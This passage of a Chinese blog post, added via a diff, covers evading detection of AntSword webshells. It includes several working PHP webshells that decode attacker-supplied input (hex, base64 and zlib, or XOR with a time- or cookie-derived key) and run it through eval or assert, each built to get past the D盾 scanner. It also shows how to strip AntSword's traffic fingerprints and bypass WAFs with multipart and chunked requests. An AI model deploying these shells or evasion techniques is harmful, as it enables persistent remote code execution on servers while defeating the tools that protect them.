_ 原有的payload</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  // 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function Hex2String($hex)&#123;</span><br><span class="line">    $string=&#x27;&#x27;;</span><br><span class="line">    for ($i=0; $i &lt; strlen($hex)-1; $i+=2)&#123;</span><br><span class="line">        $string .= chr(hexdec($hex[$i].$hex[$i+1]));</span><br><span class="line">    &#125;</span><br><span class="line">    echo $string;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line">$a=&quot;assert&quot;;</span><br><span class="line">$c=Hex2String($_POST[&#x27;ant&#x27;]);</span><br><span class="line">$b=array(&#x27;&#x27;=&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后效果如下;</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728105845603.png" alt="image-20200728105845603"></p>
+<p>这种简单的编解码处理可能防护设备也会自己解码，我们可以使用各种加密，或者自己写一个简单的算法对数据进行处理，甚至使用多种编解码+加密方式混合处理。</p>
+<h5 id="特征四：返回包格式"><a href="#特征四：返回包格式" class="headerlink" title="特征四：返回包格式"></a>特征四：返回包格式</h5><p>我这里查看了下蚁剑处理返回包的模板，发现其实蚁剑对返回包的分隔符的长度是随机生成的，代码在source/core/php/index.js中</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728111846522.png" alt="image-20200728111846522"></p>
+<p>所以在返回包处理这部分，我们更应该关注的不是返回包格式的问题，而是返回的明文内容的问题，这些特征都是特别明显的。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112128155.png" alt="image-20200728112128155"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112144427.png" alt="image-20200728112144427"></p>
+<p>这里蚁剑本身就提供了一些解码器使用，比如base64解码，只要我们在使用的时候选择解码器就行了，不用我们在shell里面添加解码功能。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134220904.png" alt="image-20200728134220904"></p>
+<p>使用效果如下：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134243030.png" alt="image-20200728134243030"></p>
+<p>我们再看下我们发送的数据是怎么样的，如下图所示，就是我们发送的数据包中让其在输出的时候做了一个base64的编码</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134401588.png" alt="image-20200728134401588"></p>
+<p>同理，蚁剑还提供了rot13的解码器，使用效果如下：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134524436.png" alt="image-20200728134524436"></p>
+<h5 id="特征五：custom-shell的特性"><a href="#特征五：custom-shell的特性" class="headerlink" title="特征五：custom shell的特性"></a>特征五：custom shell的特性</h5><p>首先我们使用一个custom模式的shell，然后抓包看下返回包,有没有看到一个非常明显的特征。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728152948041.png" alt="image-20200728152948041"></p>
+<p>对的，如你所见，这个特征就是-&gt;|和|&lt;-，正常的数据包中基本不会出现这个，因此这个也会被当作是蚁剑的特征。因为这边我们只传入了一个A，因此返回的处理逻辑肯定是写在custom的shell里的，我在shell中找到了对应的代码，但是直接删除后发现蚁剑不能正常工作了，也就是如果要删除这个东西会影响蚁剑对返回包的解析，因此可能需要修改蚁剑处理custom模式返回包部分的代码。在蚁剑的source/core/custom/index.js中，我找到了对应的代码位置。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728153806619.png" alt="image-20200728153806619"></p>
+<p>所以我们只要对这部分进行修改就可以了，我们要确保这个符号不会在返回包的内容中出现，我这里随便取了个@#来作为分割符。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154120506.png" alt="image-20200728154120506"></p>
+<p>同样，我们要在蚁剑的custom shell中进行相应的修改。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154150241.png" alt="image-20200728154150241"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154202049.png" alt="image-20200728154202049"></p>
+<p>然后就可以正常的使用了</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154219306.png" alt="image-20200728154219306"></p>
+<p>关于custom模式，还有第二个特性，就是关于传入的参数的参数名，z0,z1,z2等等，这个也算一个特征把，所以我们也需要把它处理一下，这个同样需要在shell和蚁剑同时处理，我在php的custom shell中找到了如下代码</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160653504.png" alt="image-20200728160653504"></p>
+<p>所以我们需要把这几个参数改成比较正常的参数名。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162411446.png" alt="image-20200728162411446"></p>
+<p>然后需要在蚁剑中找到这部分代码进行处理，这个处理就比较麻烦些，因为在好几个文件中都出现了。然后我分别在如下的几个文件中做了处理。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source\core\custom\template\database\default.js</span><br><span class="line">source\core\custom\template\command.js</span><br><span class="line">source\core\custom\template\filemanager.js</span><br></pre></td></tr></table></figure>
+
+<p>处理后效果如下：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162553173.png" alt="image-20200728162553173"></p>
+<h4 id="流量免杀"><a href="#流量免杀" class="headerlink" title="流量免杀"></a>流量免杀</h4><p>最后我们来学学流量混淆这部分，其实这里一方面是运用各种加密解密来对流量进行混淆，另一方面就是使用一些蚁剑本身提供的特性来进行混淆。</p>
+<h5 id="方法一：更改post的格式为Multipart"><a href="#方法一：更改post的格式为Multipart" class="headerlink" title="方法一：更改post的格式为Multipart"></a>方法一：更改post的格式为Multipart</h5><p>我们如果之前简单了解过一些绕WAF的技巧，我们就知道有些WAF针对于不同的请求类型的拦截规则是不一样的，大多数的WAF会对GET类型的请求拦截非常严格，但是对于POST会弱一些，有时候假如我们改变了请求体的方式为Multipart，有些WAF甚至只会检测文件上传漏洞，所以呢，可以通过这个特性来进行简单的绕过。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155455601.png" alt="image-20200728155455601"></p>
+<p>设置后的效果如下：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155629444.png" alt="image-20200728155629444"></p>
+<h5 id="方法二：分块传输"><a href="#方法二：分块传输" class="headerlink" title="方法二：分块传输"></a>方法二：分块传输</h5><p>之前别人公开了分块传输绕WAF的方法后，后来做项目中遇到不少WAF都可以直接通过分块传输绕过。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155810488.png" alt="image-20200728155810488"></p>
+<p>这里我设置好并刷新了下缓存，然后在burp上查看发包的这个过程，比较奇怪的是并没有发现分块传输的迹象。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160222681.png" alt="image-20200728160222681"></p>
+<p>不过有老哥已经写了burp的分块传输的插件，我们可以将蚁剑的流量代理到burp上，再使用分块插件进行分块，嗯，真香。</p>
+<p>蚁剑中设置：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163023441.png" alt="image-20200728163023441"></p>
+<p>burp插件中设置：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163044919.png" alt="image-20200728163044919"></p>
+<p>然后就可以分块了。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163127083.png" alt="image-20200728163127083"></p>
+<h5 id="方法三：各种编码解码器"><a href="#方法三：各种编码解码器" class="headerlink" title="方法三：各种编码解码器"></a>方法三：各种编码解码器</h5><p>蚁剑作者给了很多编解码器，地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AwesomeEncoder">https://github.com/AntSwordProject/AwesomeEncoder</a></p>
+<p><strong>zlib</strong></p>
+<p>在这个编码器里面也有关于如何去处理shell的提示</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165427727.png" alt="image-20200728165427727"></p>
+<p>我将之前测试免杀D盾的shell稍微改了一下就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=&quot;assert&quot;;</span><br><span class="line">$c=$_POST[&#x27;ant&#x27;];</span><br><span class="line">$d=base64_decode($c);</span><br><span class="line">$e=gzinflate($d);</span><br><span class="line">$b=array(&#x27;&#x27;=&gt;$a($e));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后效果如下:</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165614745.png" alt="image-20200728165614745"></p>
+<p><strong>动态密钥</strong></p>
+<p>因为之前有人分析冰蝎的加密，得出可以通过获取密钥的那个数据包来对冰蝎的指纹进行识别，所以yzddmr6前辈为了写了两款关于动态密钥的编码器，一个是基于时间生成密钥的，还有一个是通过随机cookie来生成的，我们都学习一下吧。</p>
+<p><strong>基于时间的动态密钥</strong></p>
+<p>我们跟着代码稍微学习一下，下面这段代码是比较简单和，和蚁剑自带的编码器代码没有什么区别，主要的操作在xor函数里。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174216362.png" alt="image-20200728174216362"></p>
+<p>跟进到xor函数里，函数里获取了当前的时间，并调用switch对时间的格式进行处理，switch这个函数是自定义的处理函数。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174601774.png" alt="image-20200728174601774"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174701365.png" alt="image-20200728174701365"></p>
+<p>使用格式化后的time的md5值作为key,对payload进行异或处理。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174910075.png" alt="image-20200728174910075"></p>
+<p>要使用这个编码器我们需要对我们的shell做一定的处理，需要在shell中加入解密的逻辑代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;PRC&quot;);</span><br><span class="line">@$post=base64_decode($_REQUEST[&#x27;yzddmr6&#x27;]);</span><br><span class="line">$key=md5(date(&quot;Y-m-d H:i&quot;,time()));</span><br><span class="line">for($i=0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">    $post[$i] = $post[$i] ^ $key[$i%32];</span><br><span class="line">&#125;</span><br><span class="line">eval($post);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后数据包是这样的</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175747960.png" alt="image-20200728175747960"></p>
+<p>base64解码后也是看不到明文内容的</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175815387.png" alt="image-20200728175815387"></p>
+<p><strong>基于cookie的动态密钥</strong></p>
+<p>这种方法生成26位的随机字符放在了cookie的PHPSESSID中，设置方法基于时间的差不多，最后效果如下：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728180915972.png" alt="image-20200728180915972"></p>
+<p>这里yzddmr6前辈还给出了一个免杀的shell，我们分析下这个shell为什么就能免杀D盾</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Cookie</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $key=@$_COOKIE[&#x27;PHPSESSID&#x27;];</span><br><span class="line">        @$post=base64_decode($_REQUEST[&#x27;test&#x27;]);</span><br><span class="line">        for($i=0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">            $post[$i] = $post[$i] ^ $key[$i%26];</span><br><span class="line">        &#125;</span><br><span class="line">        return $post;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;return @eval($this-&gt;__construct());&#125;</span><br><span class="line">&#125;</span><br><span class="line">$check=new Cookie();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我基本把代码都删完了，发现当仅仅留下下面这段代码的时候D盾是会爆1级的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;return @eval($this-&gt;__construct());&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181601624.png" alt="image-20200728181601624"></p>
+<p>然后前面加个函数名就不会杀了。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181726799.png" alt="image-20200728181726799"></p>
+<p>而且当直接调用eval($this)会升到4级，但是使用$this-&gt;__construct()这种形式就少了很多。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181848146.png" alt="image-20200728181848146"></p>
+<p>再测试了下，当参数中有-&gt;等级会下降很多，再加上参数+括号就不报了。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182041283.png" alt="image-20200728182041283"></p>
+<p><strong><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182102746.png" alt="image-20200728182102746"></strong></p>
+<p>所以对于其他敏感函数的拦截我们是不是也可以通过这种调用的方式绕过D盾的拦截。</p>
+<p>我使用assert再进行了测试，直接这样绕是会爆一级的，但是在这个代码前加上其他函数就不杀了，所以我们又学到一个小技巧，就是可以把我们代码执行的函数放在其他函数的后面。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182629591.png" alt="image-20200728182629591"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过对蚁剑免杀的学习，终于明白为什么我的shell总会被杀了，所以深入了解一个工具是非常有必要的。</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://yzddmr6.tk/posts/antsword-xor-encoder-2/">基于随机Cookie的蚁剑动态秘钥编码器</a></p>
+<p><a target="_blank" rel="noopener" href="https://yzddmr6.tk/posts/antsword-xor-encoder/">蚁剑实现动态秘钥编码器解码器</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483852&idx=1&sn=3cd3f667523550d414fad97231eeeaea&chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&mpshare=1&scene=23&srcid&sharer_sharetime=1572778022447&sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd">蚁剑绕WAF进化图鉴</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4000#toc-4">从静态到动态打造一款免杀的antSword(蚁剑)</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/webshell/">webshell</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
